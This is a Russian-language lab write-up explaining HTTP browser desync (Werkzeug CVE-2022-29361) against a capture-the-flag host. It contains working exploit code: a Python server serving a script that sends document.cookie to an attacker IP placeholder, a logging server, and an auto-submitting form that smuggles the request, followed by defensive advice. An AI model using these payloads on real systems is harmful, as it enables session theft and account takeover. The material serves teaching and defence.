# HTTP Browser Desync (десинхронизация в браузере)

1. Определение

HTTP Browser Desync — атака, использующая несоответствие в обработке границ HTTP-запросов на стороне сервера (или прокси) для внедрения произвольного запроса в очередь соединения конкретного клиента. В результате следующий легитимный запрос этого клиента подменяется внедрённым, что позволяет атакующему выполнить действия от лица жертвы или украсть её сессионные данные.


2. Предпосылки возникновения

· Использование Keep-Alive (постоянное TCP-соединение для нескольких запросов) и HTTP Pipelining (отправка нескольких запросов без ожидания ответов).
· Сервер неправильно интерпретирует длину тела запроса (Content-Length) при наличии в теле данных, похожих на HTTP-запрос.
· Уязвимость в конкретных реализациях серверов (например, Werkzeug версии ≤ 2.1.0, CVE-2022-29361).


3. Механизм атаки (по шагам)

1. Отравление соединения
   Атакующий отправляет на целевой сервер POST-запрос с телом, содержащим второй HTTP-запрос (например, GET /redirect HTTP/1.1).
   Сервер из-за ошибки в обработке Content-Length «отрезает» часть тела и помещает оставшийся второй запрос в буфер соединения как следующий ожидаемый запрос от этого клиента.
2. Ожидание следующего запроса жертвы
   Жертва (или тот же клиент) вскоре делает обычный запрос на сервер (например, загружает главную страницу).
3. Подмена запроса
   Сервер, видя, что в очереди соединения уже есть «следующий» запрос, обрабатывает его вместо запроса, который только что пришёл от клиента. Внедрённый запрос выполняется с теми же сессионными куками, что и у жертвы, так как соединение принадлежит ей.
4. Результат
   Выполняется действие, задуманное атакующим (например, переход на вредоносный ресурс или изменение данных).


4. Идентификация уязвимости

· Отправка тестового fetch-запроса из консоли браузера:
  ```javascript
  fetch('http://challenge.thm/', {
      method: 'POST',
      body: 'GET /redirect HTTP/1.1\r\nFoo: x',
      mode: 'cors',
  })
  ```
· Если после этого обновить страницу и получить ответ 404 (или ошибку), значит, сервер попытался обработать внедрённый GET-запрос к несуществующему ресурсу – уязвимость присутствует.


5. Эксплуатация для кражи куки (совместно с XSS)

Для кражи куки необходимо, чтобы внедрённый запрос привёл к выполнению JavaScript в контексте целевого домена. Это достигается путём проксирования внешнего URL самим сервером.

Этапы эксплуатации:

5.1. Подготовка серверов атакующего

· Сервер А (порт 1337) – отдаёт HTML-страницу с JavaScript-скриптом, который отправляет document.cookie на сервер атакующего.
· Сервер B (порт 8080) – простой HTTP-сервер для логирования входящих GET-запросов (принимает куку).

Можно использовать один сервер, различая пути, но для ясности часто используют два.

5.2. Создание отравляющего запроса (гаджета)
Используется HTML-форма, которая отправляет POST на http://challenge.thm/ с телом, содержащим второй запрос к серверу А:

```
GET http://<IP_атакующего>:1337/ HTTP/1.1
```

Важно: форма должна иметь enctype="text/plain", чтобы данные не кодировались.

5.3. Доставка гаджета жертве
Через любой вектор, позволяющий внедрить HTML-код на страницу, которую посетит жертва (например, через уязвимость XSS на /vulnerablecontact). Форма автоматически отправляется с помощью btn.submit().

5.4. Десинхронизация и проксирование

· POST-запрос жертвы создаёт десинхронизацию – сервер challenge.thm сохраняет внедрённый GET-запрос в очереди.
· Когда жертва делает следующий запрос, сервер challenge.thm пытается выполнить сохранённый GET на внешний URL (наш сервер А). Он выступает как прокси: сам инициирует соединение с <IP_атакующего>:1337, получает ответ и возвращает его браузеру жертвы как свой собственный.

5.5. Выполнение скрипта в контексте целевого домена
Браузер жертвы получает HTML-страницу от challenge.thm (физически содержимое с сервера А). Так как ответ пришёл с challenge.thm, origin страницы – challenge.thm, и скрипт имеет доступ к document.cookie этого домена.

5.6. Эксфильтрация куки
Скрипт выполняет:

```javascript
fetch('http://<IP_атакующего>:8080/?' + document.cookie);
```

Этот запрос уходит напрямую на сервер B (порт 8080) атакующего, где в логах появляется кука (или флаг).


6. Почему браузер доверяет ответу

Браузер определяет origin ответа по домену, который фактически отправил HTTP-ответ. В данном случае ответ приходит от challenge.thm (этот сервер проксировал наш контент). Поэтому браузер считает, что страница загружена с challenge.thm, и разрешает скрипту читать куки этого домена.


7. Схема атаки (текстовое представление)

```
[Атакующий]
   │
   │ 1. Запускает сервер А (порт 1337) – отдает скрипт
   │ 2. Запускает сервер B (порт 8080) – логгер
   │ 3. Создает форму с телом: GET http://<IP>:1337/ HTTP/1.1
   │ 4. Заставляет жертву отправить форму на challenge.thm
   ▼
[Сервер challenge.thm]
   │ 5. Принимает POST, из-за десинхронизации сохраняет в очереди
   │    запрос GET http://<IP>:1337/
   │ 6. Жертва делает следующий запрос (например, обновляет страницу)
   │ 7. Сервер берет из очереди GET на внешний URL и делает запрос
   │    к серверу А (проксирует)
   ▼
[Сервер А (атакующий, порт 1337)]
   │ 8. Отвечает HTML: <script>fetch('http://<IP>:8080/?'+document.cookie)</script>
   │ 9. Сервер challenge.thm получает этот HTML и отправляет его
   │    браузеру жертвы как свой ответ
   ▼
[Браузер жертвы]
   │ 10. Загружает страницу с origin = challenge.thm
   │ 11. Выполняет скрипт, который читает document.cookie
   │ 12. Отправляет fetch на сервер B (порт 8080) с кукой в параметрах
   ▼
[Сервер B (атакующий, порт 8080)]
   │ 13. Логирует GET-запрос, в котором видна кука
   ▼
[Атакующий] получает куку
```


8. Примеры кода

8.1. Сервер А (порт 1337) – отдаёт скрипт

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        # Замените IP на свой и порт 8080 для логгера
        html = b"<script>fetch('http://<YOUR_IP>:8080/?' + document.cookie);</script>"
        self.wfile.write(html)

HTTPServer(('0.0.0.0', 1337), Handler).serve_forever()
```

8.2. Сервер B (порт 8080) – логгер

```bash
python3 -m http.server 8080
```

8.3. Форма-гаджет для жертвы

```html
<form id="btn" action="http://challenge.thm/"
    method="POST" enctype="text/plain">
<textarea name="GET http://<YOUR_IP>:1337/ HTTP/1.1
Foo: x">placeholder</textarea>
<button type="submit">Submit</button>
</form>
<script>document.getElementById('btn').submit();</script>
```


9. Важные замечания

· Внедрённый запрос должен быть направлен на ресурс, который сервер может проксировать. В лабораторной среде это работает для любого внешнего URL, если сервер не блокирует такие запросы.
· Если жертва не делает следующий запрос, десинхронизация не приводит к краже – поэтому в лабораторной среде жертва автоматически обновляет страницу через некоторое время.
· В некоторых случаях может потребоваться несколько попыток, так как десинхронизация иногда срабатывает не с первого раза.
· Для успеха важно, чтобы Content-Length в POST-запросе был рассчитан точно; в форме с text/plain браузер сам устанавливает длину, но нужно убедиться, что тело содержит только один перевод строки между запросами.


10. Защита от Browser Desync

· Обновление серверного ПО (для Werkzeug – версии > 2.1.0, где исправлена уязвимость).
· Отказ от Keep-Alive и Pipelining, если они не критичны.
· Использование HTTP/2, где границы запросов определены бинарно и не зависят от Content-Length.
· Строгая валидация входящих данных на предмет наличия символов перевода строки в заголовках, которые могут быть интерпретированы как разделители.
· Ограничение возможности проксирования внешних URL на уровне приложения или прокси.



11. Резюме

HTTP Browser Desync – опасная уязвимость, позволяющая атакующему манипулировать очередью запросов конкретного клиента. В сочетании с проксированием внешних URL и XSS она позволяет красть сессионные куки, обходя политику same-origin. Понимание механизма и регулярное обновление серверного ПО являются ключевыми мерами защиты.
